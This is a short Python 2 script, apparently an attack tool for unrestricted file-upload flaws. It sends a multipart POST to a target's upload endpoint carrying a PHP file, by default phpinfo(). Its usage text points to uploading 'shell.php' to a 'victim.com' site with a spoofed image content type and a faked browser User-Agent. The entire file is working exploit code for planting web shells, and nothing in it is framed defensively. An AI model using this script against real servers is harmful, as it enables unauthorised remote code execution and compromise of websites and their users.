#!/usr/bin/python
import os
import requests
import sys

# Defaults
content_type = 'application/octet-stream'
upload_file = 'test.php'
upload_content = '<?php phpinfo(); ?>'
variable = 'file'

def usage(fault=0):

   print '''
   Usage: upload.py [-u][-f][--content-type][--variable][--origin]
          
          -u http://victim.com/upload.php 
          -f shell.php  (this file will be uploaded)
          --content-type image/png 
          --variable myfile (variable of file form parameter)
          --origin http://victim.com/index.php
   
          if -f not specified, it will upload '<?php phpinfo(); ?>' to test.php
'''
   if fault:
      print 'Error with %s parameter...' % fault
   exit()

if not len(sys.argv[1:]): usage()

params = sys.argv[1:]

def opt(v):
   return params[params.index(v)+1]

if '-u' in params:
   url = opt('-u')
else:
   usage('-u')
   
if '-f' in params:
   if os.path.isfile(opt('-f')):
      f = open(opt('-f'),'rb')
      upload_content = f.read()
      upload_file = opt('-f')
      f.close()
   else: 
      usage('-f')

if '--content-type' in params:
   content_type = opt('--content-type')

if '--origin' in params:
   origin = opt('--origin')
else:
   origin = opt('-u')

if '--variable' in params:
   variable = opt('--variable')

session = requests.Session()

paramsPost = {"submit":"submit"}
paramsMultipart = [(variable, (upload_file, upload_content, content_type))]
headers = {"Origin":origin,"Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","User-Agent":"Mozilla/5.0 (X11; Linux x86) AppleWebKit/524.12 (KHTML, like Gecko) Chrome/52.0.2963.251 Safari/524.12","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.8"}
response = session.post(url, data=paramsPost, files=paramsMultipart, headers=headers)

print "Status code:", response.status_code
